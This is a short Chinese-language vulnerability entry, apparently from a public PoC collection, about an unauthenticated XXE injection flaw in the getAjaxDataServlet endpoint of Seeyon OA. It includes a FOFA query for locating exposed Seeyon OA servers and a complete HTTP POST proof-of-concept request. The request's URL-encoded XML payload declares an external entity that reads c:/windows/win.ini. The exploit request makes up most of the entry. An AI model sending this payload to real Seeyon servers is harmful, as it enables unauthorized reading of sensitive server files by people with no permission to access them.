## 致远OA_getAjaxDataServlet接口存在任XXE漏洞

致远互联-OA getAjaxDataServlet 接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。


## fofa
```
app="致远互联-OA"
```

## poc
```
POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
Host: 127.0.0.1
Content-Length: 581
Expect: 100-continue
Connection: close

S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E
```

![7f69187733a77b19c7e8b2c772ca1a8b](https://github.com/wy876/POC/assets/139549762/677f206c-4f2d-479d-88d7-534377e279ea)
